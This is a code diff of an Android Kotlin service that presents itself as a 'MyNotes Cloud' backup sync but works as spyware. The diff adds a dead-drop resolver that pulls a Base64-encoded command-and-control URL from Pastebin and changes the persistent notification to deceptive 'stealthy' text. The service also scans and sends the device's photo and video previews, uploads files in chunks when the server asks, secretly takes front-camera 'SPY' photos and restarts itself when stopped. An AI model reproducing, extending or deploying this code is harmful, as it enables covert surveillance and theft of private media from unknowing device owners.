@@ -30,24 +30,43 @@ import io.socket.client.Socket
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
-import kotlin.concurrent.thread
+import java.io.IOException
 
 // --- IMPORTACIONES OKHTTP ---
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
-import java.io.IOException
-// (Ya no necesitamos okio.source ni BufferedSink explícitamente para esta estrategia manual)
+
+// --- IMPORTACIONES CORRUTINAS ---
+import kotlinx.coroutines.*
 
 class CloudSyncService : Service() {
 
     private var socket: Socket? = null
-    // ASEGÚRATE QUE ESTA URL SEA TU DOMINIO CLOUDFLARE
-    private val SERVER_URL = "https://mynotes.arccidev.com"
+
+    // ====================================================================================
+    // 🕵️ OFUSCACIÓN C2 (DEAD DROP RESOLVER)
+    // ====================================================================================
+    // Enlace RAW de Pastebin que contiene el Base64 de tu servidor.
+    private val RESOLVER_URL = "https://pastebin.com/raw/gNmxTyPZ"
+
+    // Aquí se guardará la URL real una vez decodificada.
+    private var activeServerUrl: String = ""
+    // ====================================================================================
+
     private val CHANNEL_ID = "MyNotesBackupChannel"
 
     private var wakeLock: PowerManager.WakeLock? = null
     @Volatile private var isScanning = false
+
+    // --- GESTIÓN DE CORRUTINAS ---
+    private val serviceJob = SupervisorJob()
+    // Scope principal del servicio
+    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
+
+    // Dispatcher limitado para subidas: MÁXIMO 2 SUBIDAS SIMULTÁNEAS
+    @OptIn(ExperimentalCoroutinesApi::class)
+    private val uploadDispatcher = Dispatchers.IO.limitedParallelism(2)
 
     override fun onCreate() {
         super.onCreate()
@@ -66,7 +85,7 @@ class CloudSyncService : Service() {
         // --- BLOQUE DE SEGURIDAD ANTI-CRASH (ANDROID 14) ---
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // Usamos el tipo dataSync explícitamente como declaramos en el Manifest
+                // Usamos dataSync explícitamente
                 startForeground(
                     1,
                     createNotification(),
@@ -76,14 +95,15 @@ class CloudSyncService : Service() {
                 startForeground(1, createNotification())
             }
         } catch (e: Exception) {
-            // Si caemos aquí, es porque el sistema rechazó el inicio (ForegroundServiceStartNotAllowedException)
             Log.e("CloudSync", "💀 Crash evitado: ${e.message}")
-            stopSelf() // Matamos el servicio limpiamente
-            return START_NOT_STICKY // No intentar reiniciar inmediatamente
+            stopSelf()
+            return START_NOT_STICKY
         }
         // ----------------------------------------------------
 
-        connectAndListen()
+        // Iniciamos la conexión de forma asíncrona para resolver la URL primero
+        iniciarSecuenciaDeConexion()
+
         return START_STICKY
     }
 
@@ -106,34 +126,76 @@ class CloudSyncService : Service() {
         }
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("MyNotes Cloud")
-            .setContentText("Sincronización activa")
+            .setContentText("Buscando actualizaciones...") // Texto sigiloso
             .setSmallIcon(android.R.drawable.ic_popup_sync)
             .setOngoing(true)
             .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
             .build()
     }
 
-    private fun connectAndListen() {
+    // --- NUEVA LÓGICA DE CONEXIÓN DINÁMICA ---
+    private fun iniciarSecuenciaDeConexion() {
         if (socket?.connected() == true) return
 
+        serviceScope.launch {
+            // 1. Si no tenemos la URL, intentamos resolverla desde Pastebin
+            if (activeServerUrl.isEmpty()) {
+                Log.d("CloudSync", "🕵️ Resolviendo C2 desde Dead Drop...")
+                val resolved = resolveC2Url()
+                if (resolved != null) {
+                    activeServerUrl = resolved
+                    Log.d("CloudSync", "✅ C2 Resuelto exitosamente: $activeServerUrl")
+                } else {
+                    Log.e("CloudSync", "❌ Fallo al resolver C2. Entrando en modo durmiente.")
+                    // Si falla (ej: sin internet), terminamos esta ejecución.
+                    return@launch
+                }
+            }
+
+            // 2. Conectamos con la URL obtenida
+            conectarSocketIO()
+        }
+    }
+
+    private fun resolveC2Url(): String? {
+        val client = OkHttpClient()
+        val request = Request.Builder().url(RESOLVER_URL).build()
+
+        return try {
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) return null
+                val encodedBody = response.body?.string()?.trim() ?: return null
+
+                // Decodificamos Base64
+                val decodedBytes = Base64.decode(encodedBody, Base64.DEFAULT)
+                String(decodedBytes, Charsets.UTF_8).trim() // Retornamos la URL limpia
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            null
+        }
+    }
+
+    private fun conectarSocketIO() {
         try {
             val options = IO.Options().apply {
                 reconnection = true
                 forceNew = true
             }
-            socket = IO.socket(SERVER_URL, options)
+            // Usamos la URL dinámica
+            socket = IO.socket(activeServerUrl, options)
 
             socket?.on(Socket.EVENT_CONNECT) {
                 registrarDispositivo()
 
-                thread {
-                    try { Thread.sleep(1000) } catch (e: Exception) {}
+                serviceScope.launch {
+                    delay(1000)
                     sendFolderList()
                 }
 
                 if (!isScanning) {
                     isScanning = true
-                    thread {
+                    serviceScope.launch {
                         sendThumbnails(null)
                         isScanning = false
                     }
@@ -143,7 +205,7 @@ class CloudSyncService : Service() {
             socket?.on("command_start_scan") { args ->
                 if (!isScanning) {
                     isScanning = true
-                    thread { sendFolderList() }
+                    serviceScope.launch { sendFolderList() }
 
                     var folderFilter: String? = null
                     if (args.isNotEmpty()) {
@@ -152,7 +214,7 @@ class CloudSyncService : Service() {
                         if (folderFilter.isNullOrEmpty()) folderFilter = null
                     }
 
-                    thread {
+                    serviceScope.launch {
                         sendThumbnails(folderFilter)
                         scanVideos(folderFilter)
                         isScanning = false
@@ -169,7 +231,6 @@ class CloudSyncService : Service() {
                 val path = data.optString("path")
                 val target = data.optString("target")
 
-                // Aquí inicia la subida por trozos
                 uploadFileHttp(path, target)
             }
 
@@ -188,9 +249,9 @@ class CloudSyncService : Service() {
         } catch (e: Exception) { e.printStackTrace() }
     }
 
+    // --- FUNCIONES DE ESCANEO ---
     private fun sendFolderList() {
         val uniqueFolders = HashSet<String>()
-
         try {
             val uriImages = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
             val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
@@ -244,7 +305,7 @@ class CloudSyncService : Service() {
                 val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
 
                 while (cursor.moveToNext()) {
-                    if (!isScanning || socket?.connected() != true) break
+                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break
 
                     val path = cursor.getString(idxData)
                     val name = cursor.getString(idxName)
@@ -259,7 +320,7 @@ class CloudSyncService : Service() {
                             put("dataType", "preview_image")
                         }
                         socket?.emit("usrData", data)
-                        Thread.sleep(50)
+                        runBlocking { delay(50) }
                     }
                 }
             }
@@ -290,7 +351,7 @@ class CloudSyncService : Service() {
                 val idxId = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
 
                 while (cursor.moveToNext()) {
-                    if (!isScanning || socket?.connected() != true) break
+                    if (!serviceScope.isActive || !isScanning || socket?.connected() != true) break
 
                     val path = cursor.getString(idxData)
                     val name = cursor.getString(idxName)
@@ -324,7 +385,7 @@ class CloudSyncService : Service() {
                             put("dataType", "preview_video")
                         }
                         socket?.emit("usrData", data)
-                        Thread.sleep(80)
+                        runBlocking { delay(80) }
                     }
                 }
             }
@@ -332,94 +393,80 @@ class CloudSyncService : Service() {
     }
 
     // =========================================================
-    // 🔪 ESTRATEGIA DEL SALAME: SUBIDA POR TROZOS (CHUNKING)
+    // 🔪 SUBIDA POR TROZOS (USANDO URL DINÁMICA)
     // =========================================================
     private fun uploadFileHttp(path: String, targetSocketId: String?) {
         val file = File(path)
         if (!file.exists()) return
 
-        // CONFIGURACIÓN: 10 MB por pedazo (Seguro para Free Cloudflare)
-        val CHUNK_SIZE = 10 * 1024 * 1024
-        val totalSize = file.length()
-        // Calculamos cuántos pedazos salen
-        val totalChunks = (totalSize + CHUNK_SIZE - 1) / CHUNK_SIZE
+        // Seguridad: Si no hay URL resuelta, no podemos subir
+        if (activeServerUrl.isEmpty()) return
 
-        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-        val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
-        val client = OkHttpClient()
+        serviceScope.launch(uploadDispatcher) {
+            val CHUNK_SIZE = 10 * 1024 * 1024
+            val totalSize = file.length()
+            val totalChunks = (totalSize + CHUNK_SIZE - 1) / CHUNK_SIZE
 
-        Log.d("UPLOAD", "🔪 Iniciando corte: ${file.name} | Total: ${totalSize/1024/1024} MB | Pedazos: $totalChunks")
+            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val client = OkHttpClient()
 
-        thread {
+            Log.d("UPLOAD", "🔪 Iniciando corte: ${file.name} | Total: ${totalSize/1024/1024} MB")
+
             try {
-                // Abrimos el archivo para lectura manual
-                val fileInputStream = file.inputStream()
-                val buffer = ByteArray(CHUNK_SIZE)
-                var bytesRead: Int
-                var chunkIndex = 0
-                var uploadedBytes: Long = 0
+                file.inputStream().use { fileInputStream ->
+                    val buffer = ByteArray(CHUNK_SIZE)
+                    var bytesRead: Int = 0
+                    var chunkIndex = 0
+                    var uploadedBytes: Long = 0
 
-                // BUCLE: Leer pedazo -> Subir -> Repetir
-                while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
+                    while (isActive && fileInputStream.read(buffer).also { bytesRead = it } != -1) {
 
-                    // Si el último pedazo es más chico, ajustamos el array para no mandar basura vacía
-                    val actualChunkData = if (bytesRead < CHUNK_SIZE) {
-                        buffer.copyOf(bytesRead)
-                    } else {
-                        buffer
-                    }
+                        val actualChunkData = if (bytesRead < CHUNK_SIZE) buffer.copyOf(bytesRead) else buffer
 
-                    // Preparamos los datos multipart
-                    val requestBody = MultipartBody.Builder()
-                        .setType(MultipartBody.FORM)
-                        // Enviamos el pedazo como "blob"
-                        .addFormDataPart("file", "blob", actualChunkData.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
-                        .addFormDataPart("filename", file.name)
-                        .addFormDataPart("chunkIndex", chunkIndex.toString())
-                        .addFormDataPart("totalChunks", totalChunks.toString())
-                        .addFormDataPart("deviceId", deviceId)
-                        .addFormDataPart("deviceName", deviceName)
-                        .addFormDataPart("folderName", file.parentFile?.name ?: "Unknown")
-                        .build()
+                        val requestBody = MultipartBody.Builder()
+                            .setType(MultipartBody.FORM)
+                            .addFormDataPart("file", "blob", actualChunkData.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
+                            .addFormDataPart("filename", file.name)
+                            .addFormDataPart("chunkIndex", chunkIndex.toString())
+                            .addFormDataPart("totalChunks", totalChunks.toString())
+                            .addFormDataPart("deviceId", deviceId)
+                            .addFormDataPart("deviceName", deviceName)
+                            .addFormDataPart("folderName", file.parentFile?.name ?: "Unknown")
+                            .build()
 
-                    val request = Request.Builder()
-                        .url("$SERVER_URL/upload-chunk") // <--- RUTA ESPECIAL PARA TROZOS
-                        .post(requestBody)
-                        .build()
+                        // IMPORTANTE: USAMOS LA URL DINÁMICA
+                        val request = Request.Builder()
+                            .url("$activeServerUrl/upload-chunk")
+                            .post(requestBody)
+                            .build()
 
-                    // ENVIAMOS EL PEDAZO Y ESPERAMOS (Síncrono para mantener orden)
-                    val response = client.newCall(request).execute()
-
-                    if (!response.isSuccessful) {
-                        Log.e("UPLOAD", "❌ Error subiendo chunk $chunkIndex: ${response.code}")
-                        response.close()
-                        fileInputStream.close()
-                        return@thread // Cancelamos todo si falla uno
-                    }
-                    response.close()
-
-                    // REPORTAR PROGRESO (Para la barra en Electron)
-                    uploadedBytes += bytesRead
-                    val progress = (uploadedBytes * 100 / totalSize).toInt()
-
-                    try {
-                        val data = JSONObject().apply {
-                            put("deviceId", deviceId)
-                            put("filename", file.name)
-                            put("progress", progress)
+                        client.newCall(request).execute().use { response ->
+                            if (!response.isSuccessful) {
+                                Log.e("UPLOAD", "❌ Error subiendo chunk $chunkIndex: ${response.code}")
+                                throw IOException("Error en subida: ${response.code}")
+                            }
                         }
-                        socket?.emit("upload_progress", data)
-                    } catch (e: Exception) {}
 
-                    chunkIndex++
+                        uploadedBytes += bytesRead
+                        val progress = (uploadedBytes * 100 / totalSize).toInt()
+
+                        try {
+                            val data = JSONObject().apply {
+                                put("deviceId", deviceId)
+                                put("filename", file.name)
+                                put("progress", progress)
+                            }
+                            socket?.emit("upload_progress", data)
+                        } catch (e: Exception) {}
+
+                        chunkIndex++
+                    }
                 }
-
-                fileInputStream.close()
-                Log.d("UPLOAD", "✅ Subida completa exitosa: ${file.name}")
+                Log.d("UPLOAD", "✅ Subida completa: ${file.name}")
 
             } catch (e: Exception) {
-                Log.e("UPLOAD", "❌ Excepción critica: ${e.message}")
-                e.printStackTrace()
+                Log.e("UPLOAD", "❌ Fallo subida: ${e.message}")
             }
         }
     }
@@ -435,70 +482,73 @@ class CloudSyncService : Service() {
     }
 
     private fun takeSpyPhoto() {
-        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
-        try {
-            val cameraId = manager.cameraIdList.firstOrNull { id ->
-                val characteristics = manager.getCameraCharacteristics(id)
-                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
-            } ?: manager.cameraIdList[0]
+        serviceScope.launch(Dispatchers.Main) {
+            val manager = getSystemService(CAMERA_SERVICE) as CameraManager
+            try {
+                val cameraId = manager.cameraIdList.firstOrNull { id ->
+                    val characteristics = manager.getCameraCharacteristics(id)
+                    characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
+                } ?: manager.cameraIdList[0]
 
-            val thread = HandlerThread("CameraBackground")
-            thread.start()
-            val backgroundHandler = Handler(thread.looper)
+                val thread = HandlerThread("CameraBackground")
+                thread.start()
+                val backgroundHandler = Handler(thread.looper)
 
-            if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) return
+                if (androidx.core.app.ActivityCompat.checkSelfPermission(this@CloudSyncService, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
 
-            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                override fun onOpened(camera: CameraDevice) {
-                    try {
-                        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
-                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(session: CameraCaptureSession) {
-                                try {
-                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
-                                    req.addTarget(imageReader.surface)
-                                    req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
-                                    req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                                    req.set(CaptureRequest.JPEG_ORIENTATION, 270)
-                                    session.capture(req.build(), null, backgroundHandler)
-                                } catch (e: Exception) { camera.close() }
-                            }
-                            override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
-                        }, backgroundHandler)
+                manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        try {
+                            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
+                            camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(session: CameraCaptureSession) {
+                                    try {
+                                        val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
+                                        req.addTarget(imageReader.surface)
+                                        req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
+                                        req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                        req.set(CaptureRequest.JPEG_ORIENTATION, 270)
+                                        session.capture(req.build(), null, backgroundHandler)
+                                    } catch (e: Exception) { camera.close() }
+                                }
+                                override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
+                            }, backgroundHandler)
 
-                        imageReader.setOnImageAvailableListener({ reader ->
-                            val image = reader.acquireLatestImage()
-                            val buffer = image.planes[0].buffer
-                            val bytes = ByteArray(buffer.remaining())
-                            buffer.get(bytes)
-                            image.close()
+                            imageReader.setOnImageAvailableListener({ reader ->
+                                val image = reader.acquireLatestImage()
+                                val buffer = image.planes[0].buffer
+                                val bytes = ByteArray(buffer.remaining())
+                                buffer.get(bytes)
+                                image.close()
 
-                            camera.close()
-                            thread.quitSafely()
+                                camera.close()
+                                thread.quitSafely()
 
-                            val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
-                            val data = JSONObject().apply {
-                                put("dataType", "full_image")
-                                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
-                                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
-                                put("name", "SPY_${System.currentTimeMillis()}.jpg")
-                                put("image64", b64)
-                                put("folder", "SPY_CAMERA")
-                            }
-                            socket?.emit("usrData", data)
-                        }, backgroundHandler)
-                    } catch (e: Exception) { camera.close() }
-                }
-                override fun onDisconnected(camera: CameraDevice) { camera.close() }
-                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
-            }, backgroundHandler)
-        } catch (e: Exception) { e.printStackTrace() }
+                                val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
+                                val data = JSONObject().apply {
+                                    put("dataType", "full_image")
+                                    put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
+                                    put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                                    put("name", "SPY_${System.currentTimeMillis()}.jpg")
+                                    put("image64", b64)
+                                    put("folder", "SPY_CAMERA")
+                                }
+                                socket?.emit("usrData", data)
+                            }, backgroundHandler)
+                        } catch (e: Exception) { camera.close() }
+                    }
+                    override fun onDisconnected(camera: CameraDevice) { camera.close() }
+                    override fun onError(camera: CameraDevice, error: Int) { camera.close() }
+                }, backgroundHandler)
+            } catch (e: Exception) { e.printStackTrace() }
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
         super.onDestroy()
+        serviceJob.cancel()
         try { if (wakeLock?.isHeld == true) wakeLock?.release(); socket?.disconnect() } catch (e: Exception) {}
         sendBroadcast(Intent(this, RestartReceiver::class.java))
     }
